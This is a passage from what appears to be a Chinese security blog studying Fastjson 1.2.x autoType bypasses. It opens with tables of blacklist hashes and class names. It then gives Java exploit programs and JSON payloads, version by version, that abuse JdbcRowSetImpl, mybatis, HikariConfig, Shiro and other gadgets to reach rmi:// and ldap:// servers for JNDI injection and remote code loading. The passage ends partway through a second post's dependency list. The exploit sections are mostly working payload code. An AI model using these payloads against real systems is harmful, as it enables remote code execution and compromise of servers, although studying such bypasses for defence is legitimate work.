<td>-6025144546313590215L</td>
<td>0xac6262f52c98aa39L</td>
<td>org.apache.http.conn.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-5939269048541779808L</td>
<td>0xad937a449831e8a0L</td>
<td>org.quartz.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-5885964883385605994L</td>
<td>0xae50da1fad60a096L</td>
<td>com.taobao.eagleeye.wrapper</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-3975378478825053783L</td>
<td>0xc8d49e5601e661a9L</td>
<td>org.apache.http.impl.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-2378990704010641148L</td>
<td>0xdefc208f237d4104L</td>
<td>com.ibatis.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>-905177026366752536L</td>
<td>0xf3702a4a5490b8e8L</td>
<td>org.apache.catalina.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>2660670623866180977L</td>
<td>0x24ec99d5e7dc5571L</td>
<td>org.apache.http.auth.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>2731823439467737506L</td>
<td>0x25e962f1c28f71a2L</td>
<td>br.com.anteros.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>3637939656440441093L</td>
<td>0x327c8ed7c8706905L</td>
<td>com.caucho.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>4254584350247334433L</td>
<td>0x3b0b51ecbf6db221L</td>
<td>org.apache.http.cookie.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>5274044858141538265L</td>
<td>0x49312bdafb0077d9L</td>
<td>org.javasimon.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>5474268165959054640L</td>
<td>0x4bf881e49d37f530L</td>
<td>org.apache.cocoon.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>5596129856135573697L</td>
<td>0x4da972745feb30c1L</td>
<td>org.apache.activemq.jms.pool.</td>
</tr>
<tr>
<td>1.2.67</td>
<td>6854854816081053523L</td>
<td>0x5f215622fb630753L</td>
<td>org.mortbay.jetty.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>-3077205613010077203L</td>
<td>0xd54b91cc77b239edL</td>
<td>org.apache.shiro.jndi.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>-2825378362173150292L</td>
<td>0xd8ca3d595e982bacL</td>
<td>org.apache.ignite.cache.jta.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>2078113382421334967L</td>
<td>0x1cd6f11c6a358bb7L</td>
<td>javax.swing.J</td>
</tr>
<tr>
<td>1.2.68</td>
<td>6007332606592876737L</td>
<td>0x535e552d6f9700c1L</td>
<td>org.aoju.bus.proxy.provider.</td>
</tr>
<tr>
<td>1.2.68</td>
<td>9140390920032557669L</td>
<td>0x7ed9311d28bf1a65L</td>
<td>java.awt.p</td>
</tr>
<tr>
<td>1.2.68</td>
<td>9140416208800006522L</td>
<td>0x7ed9481d28bf417aL</td>
<td>java.awt.i</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-8024746738719829346L</td>
<td>0x90a25f5baa21529eL</td>
<td>java.io.Serializable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-5811778396720452501L</td>
<td>0xaf586a571e302c6bL</td>
<td>java.io.Closeable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-3053747177772160511L</td>
<td>0xd59ee91f0b09ea01L</td>
<td>oracle.jms.AQ</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-2114196234051346931L</td>
<td>0xe2a8ddba03e69e0dL</td>
<td>java.util.Collection</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-2027296626235911549L</td>
<td>0xe3dd9875a2dc5283L</td>
<td>java.lang.Iterable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-2939497380989775398L</td>
<td>0xd734ceb4c3e9d1daL</td>
<td>java.lang.Object</td>
</tr>
<tr>
<td>1.2.69</td>
<td>-1368967840069965882L</td>
<td>0xed007300a7b227c6L</td>
<td>java.lang.AutoCloseable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>2980334044947851925L</td>
<td>0x295c4605fd1eaa95L</td>
<td>java.lang.Readable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>3247277300971823414L</td>
<td>0x2d10a5801b9d6136L</td>
<td>java.lang.Cloneable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>5183404141909004468L</td>
<td>0x47ef269aadc650b4L</td>
<td>java.lang.Runnable</td>
</tr>
<tr>
<td>1.2.69</td>
<td>7222019943667248779L</td>
<td>0x6439c4dff712ae8bL</td>
<td>java.util.EventListener</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-5076846148177416215L</td>
<td>0xb98b6b5396932fe9L</td>
<td>org.apache.commons.collections4.Transformer</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-4703320437989596122L</td>
<td>0xbeba72fb1ccba426L</td>
<td>org.apache.commons.collections4.functors</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-4314457471973557243L</td>
<td>0xc41ff7c9c87c7c05L</td>
<td>org.jdom2.transform.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-2533039401923731906L</td>
<td>0xdcd8d615a6449e3eL</td>
<td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>156405680656087946L</td>
<td>0x22baa234c5bfb8aL</td>
<td>com.p6spy.engine.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>1214780596910349029L</td>
<td>0x10dbc48446e0dae5L</td>
<td>org.apache.activemq.pool.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>3085473968517218653L</td>
<td>0x2ad1ce3a112f015dL</td>
<td>org.apache.aries.transaction.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>3129395579983849527L</td>
<td>0x2b6dd8b3229d6837L</td>
<td>org.apache.activemq.ActiveMQConnectionFactory</td>
</tr>
<tr>
<td>1.2.70</td>
<td>4241163808635564644L</td>
<td>0x3adba40367f73264L</td>
<td>org.apache.activemq.spring.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>7240293012336844478L</td>
<td>0x647ab0224e149ebeL</td>
<td>org.apache.activemq.ActiveMQXAConnectionFactory</td>
</tr>
<tr>
<td>1.2.70</td>
<td>7347653049056829645L</td>
<td>0x65f81b84c1d920cdL</td>
<td>org.apache.commons.jelly.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>7617522210483516279L</td>
<td>0x69b6e0175084b377L</td>
<td>org.apache.axis2.transport.jms.</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-4537258998789938600L</td>
<td>0xc1086afae32e6258L</td>
<td>java.io.FileReader</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-4150995715611818742L</td>
<td>0xc664b363baca050aL</td>
<td>java.io.ObjectInputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-2995060141064716555L</td>
<td>0xd66f68ab92e7fef5L</td>
<td>java.io.FileInputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-965955008570215305L</td>
<td>0xf2983d099d29b477L</td>
<td>java.io.ObjectOutputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-219577392946377768L</td>
<td>0xfcf3e78644b98bd8L</td>
<td>java.io.DataOutputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>2622551729063269307L</td>
<td>x24652ce717e713bbL</td>
<td>java.io.PrintWriter</td>
</tr>
<tr>
<td>1.2.71</td>
<td>2930861374593775110L</td>
<td>0x28ac82e44e933606L</td>
<td>java.io.Buffered</td>
</tr>
<tr>
<td>1.2.71</td>
<td>4000049462512838776L</td>
<td>0x378307cb0111e878L</td>
<td>java.io.InputStreamReader</td>
</tr>
<tr>
<td>1.2.71</td>
<td>4193204392725694463L</td>
<td>0x3a31412dbb05c7ffL</td>
<td>java.io.OutputStreamWriter</td>
</tr>
<tr>
<td>1.2.71</td>
<td>5545425291794704408L</td>
<td>0x4cf54eec05e3e818L</td>
<td>java.io.FileWriter</td>
</tr>
<tr>
<td>1.2.71</td>
<td>6584624952928234050L</td>
<td>0x5b6149820275ea42L</td>
<td>java.io.FileOutputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>7045245923763966215L</td>
<td>0x61c5bdd721385107L</td>
<td>java.io.DataInputStream</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-8754006975464705441L</td>
<td>0x868385095a22725fL</td>
<td>org.apache.commons.io.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-8382625455832334425L</td>
<td>0x8baaee8f9bf77fa7L</td>
<td>org.mvel2.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-6088208984980396913L</td>
<td>0xab82562f53e6e48fL</td>
<td>kotlin.reflect.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-4733542790109620528L</td>
<td>0xbe4f13e96a6796d0L</td>
<td>com.googlecode.aviator.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-1363634950764737555L</td>
<td>0xed13653cb45c4bedL</td>
<td>org.aspectj.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-803541446955902575L</td>
<td>0xf4d93f4fb3e3d991L</td>
<td>org.dom4j.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>860052378298585747L</td>
<td>0xbef8514d0b79293L</td>
<td>org.apache.commons.cli.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>1268707909007641340L</td>
<td>0x119b5b1f10210afcL</td>
<td>com.google.common.eventbus.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>3058452313624178956L</td>
<td>0x2a71ce2cc40a710cL</td>
<td>org.thymeleaf.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>3740226159580918099L</td>
<td>0x33e7f3e02571b153L</td>
<td>org.junit.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>3977090344859527316L</td>
<td>0x37317698dcfce894L</td>
<td>org.mockito.asm.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>4319304524795015394L</td>
<td>0x3bf14094a524f0e2L</td>
<td>com.google.common.io.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>5120543992130540564L</td>
<td>0x470fd3a18bb39414L</td>
<td>org.mockito.runners.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>5916409771425455946L</td>
<td>0x521b4f573376df4aL</td>
<td>org.mockito.cglib.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>6090377589998869205L</td>
<td>0x54855e265fe1dad5L</td>
<td>com.google.common.reflect.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>7164889056054194741L</td>
<td>0x636ecca2a131b235L</td>
<td>org.mockito.stubbing.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>8711531061028787095L</td>
<td>0x78e5935826671397L</td>
<td>org.apache.commons.codec.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>8735538376409180149L</td>
<td>0x793addded7a967f5L</td>
<td>ognl.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>8861402923078831179L</td>
<td>0x7afa070241b8cc4bL</td>
<td>com.google.common.util.concurrent.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>9140416208800006522L</td>
<td>0x7ed9481d28bf417aL</td>
<td>java.awt.i</td>
</tr>
<tr>
<td>1.2.83</td>
<td>9144212112462101475L</td>
<td>0x7ee6c477da20bbe3L</td>
<td>com.google.common.net.</td>
</tr>
</tbody></table>
<h2 id="目前未知的列表"><a href="#目前未知的列表" class="headerlink" title="目前未知的列表"></a>目前未知的列表</h2><table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.42</td>
<td>33238344207745342</td>
<td>0x761619136cc13eL</td>
<td></td>
</tr>
<tr>
<td>1.2.67</td>
<td>-831789045734283466L</td>
<td>0xf474e44518f26736L</td>
<td></td>
</tr>
<tr>
<td>1.2.71</td>
<td>3452379460455804429L</td>
<td>0x2fe950d3ea52ae0dL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-8614556368991373401L</td>
<td>0x8872f29fd0b0b7a7L</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-5472097725414717105L</td>
<td>0xb40f341c746ec94fL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-3750763034362895579L</td>
<td>0xcbf29ce484222325L</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-1800035667138631116L</td>
<td>0xe704fd19052b2a34L</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-831789045734283466L</td>
<td>0xf474e44518f26736L</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>33238344207745342L</td>
<td>0x761619136cc13eL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>3452379460455804429L</td>
<td>0x2fe950d3ea52ae0dL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>4215053018660518963L</td>
<td>0x3a7ee0635eb2bc33L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>-8614556368991373401L</td>
<td>0x8872f29fd0b0b7a7L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>-3750763034362895579L</td>
<td>0xcbf29ce484222325L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>-1800035667138631116L</td>
<td>0xe704fd19052b2a34L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>4215053018660518963L</td>
<td>0x3a7ee0635eb2bc33L</td>
<td></td>
</tr>
</tbody></table>
<h1 id="各版本的绕过"><a href="#各版本的绕过" class="headerlink" title="各版本的绕过"></a>各版本的绕过</h1><h2 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h2><p><img src="/posts/352f0278/20260126143607772.png" alt="image.png"><br>这里很明显被ban了<br>绕过方法：com.sun.rowset.JdbcRowSetImpl前面加一个L后面加一个; 进行绕过<br>记得启动AutoTypeSupport<br>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">            JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/352f0278/20260126144152031.png" alt="image.png"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/352f0278/20260126144746343.png" alt="image.png"><br>因为Lcom.sun.rowset.JdbcRowSetImpl;这个是不存在黑名单中的，一直向下走便会到LoadClass中，然后跟进去看。<br><img src="/posts/352f0278/20260126145009442.png" alt="image.png"><br>绕过的理由就在这里，如果是以L开头;结尾的话，就会去除掉，然后进行类的加载。这也就导致了绕过的成功。</p>
<h2 id="1-2-25-1-2-42"><a href="#1-2-25-1-2-42" class="headerlink" title="1. 2.25-1.2.42"></a>1. 2.25-1.2.42</h2><p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">            JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里代码逻辑会先进行提取了，所以我们直接写两个L和; 进行绕过<br><img src="/posts/352f0278/20260126145604269.png" alt="image.png"></p>
<h2 id="1-2-25-1-2-43"><a href="#1-2-25-1-2-43" class="headerlink" title="1.2.25-1.2.43"></a>1.2.25-1.2.43</h2><p>直接给出绕过exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">            JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/posts/352f0278/20260126150409222.png" alt="image.png"><br>这里除了会对L和;进行提取之外，还会对 [ 进行提取,所以可以在类前加[但是，在反序列化时还要满足特定的条件，否则会报错，我们来看一下。<br><img src="/posts/352f0278/20260126151105433.png" alt="image.png"><br>这里会对最后字符的内容是否时“[”，“{”进行校验，所以要添加上，防止报错。</p>
<h2 id="1-2-25-1-2-45"><a href="#1-2-25-1-2-45" class="headerlink" title="1.2.25-1.2.45"></a>1.2.25-1.2.45</h2><p>前提条件：要存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。<br>放个依赖包</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">3.4</span><span class="number">.6</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;rmi://localhost:1099/RO\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个在45之前的版本是不在黑名单里面的，所以可以利用的。<br><img src="/posts/352f0278/20260126160800779.png" alt="image.png"><br>再来看这里有很明显的jndi注入对吧。<br>所以绕过成功</p>
<h2 id="1-2-25-1-2-47"><a href="#1-2-25-1-2-47" class="headerlink" title="1.2.25-1.2.47"></a>1.2.25-1.2.47</h2><p>这个的绕过方法是基于checkAutoType()函数绕过的，并且不需要开启AutoTypeSupport，大致思路是通过java.lang.Class，将JdbcRowSetImpl类加载到Map缓存中，从而绕过AutoType的检测，因此需要将payload分两次发送，第一次是加载，第二次是执行，默认情况下，没有遇到加载的类checkAutoType()就会抛出异常终止程序。<br>以下是exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span>  <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;a\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&quot;</span>  </span><br><span class="line">                + <span class="string">&quot;\&quot;b\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span>  </span><br><span class="line">                + <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;autoCommit\&quot;:true&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/352f0278/20260126162146127.png" alt="image.png"><br>具体的分析大家可以看<a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x08-1-2-25-1-2-47%E8%A1%A5%E4%B8%81%E7%BB%95%E8%BF%87">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog</a>我具体就不分析了</p>
<h2 id="后续版本的链子"><a href="#后续版本的链子" class="headerlink" title="后续版本的链子"></a>后续版本的链子</h2><h3 id="Fastjson1-2-5-1-2-59"><a href="#Fastjson1-2-5-1-2-59" class="headerlink" title="Fastjson1.2.5-1.2.59"></a>Fastjson1.2.5-1.2.59</h3><p>需要开启<strong>AutoType</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Fastjson1-2-5-1-2-60"><a href="#Fastjson1-2-5-1-2-60" class="headerlink" title="Fastjson1.2.5-1.2.60"></a>Fastjson1.2.5-1.2.60</h3><p>需要开启<strong>AutoType</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Fastjson1-2-5-1-2-61"><a href="#Fastjson1-2-5-1-2-61" class="headerlink" title="Fastjson1.2.5-1.2.61"></a>Fastjson1.2.5-1.2.61</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploi</span></span><br></pre></td></tr></table></figure>
<h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson &lt;&#x3D;1.2.62"></a>Fastjson &lt;&#x3D;1.2.62</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,</span><br><span class="line">  <span class="string">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span></span><br><span class="line">&#125;<span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
<h3 id="Fastjson-1"><a href="#Fastjson-1" class="headerlink" title="Fastjson &lt;&#x3D;1.2.66"></a>Fastjson &lt;&#x3D;1.2.66</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,</span><br><span class="line">  <span class="string">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后续版本的绕过还有很多，我就不一一总结了，大家也可以看看别的文章哦</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/news/14309">Java中Fastjson各版本漏洞对抗史与总结-先知社区</a><br><a href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/#0x09-Fastjson-lt-x3D-1-2-61-%E9%80%9A%E6%9D%80">Java反序列化Fastjson篇03-Fastjson各版本绕过分析 | Drunkbaby’s Blog</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Fastjson</category>
      </categories>
  </entry>
  <entry>
    <title>fastjson4</title>
    <url>/posts/ab4b97db/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>依旧是放松了几天，然后想起来还有4和5还没有学，接着来吧。<br>这篇主要是1.2.62-1.6.68的绕过方法，以及调试分析</p>
<h1 id="1-2-62"><a href="#1-2-62" class="headerlink" title="1.2.62"></a>1.2.62</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>需要开启AutoType；</li>
<li>fastjson&lt;&#x3D;1.2.62</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>需要xbean-reflect包，不限版本<br>依赖为：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.62<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xbean<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xbean-reflect<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"> 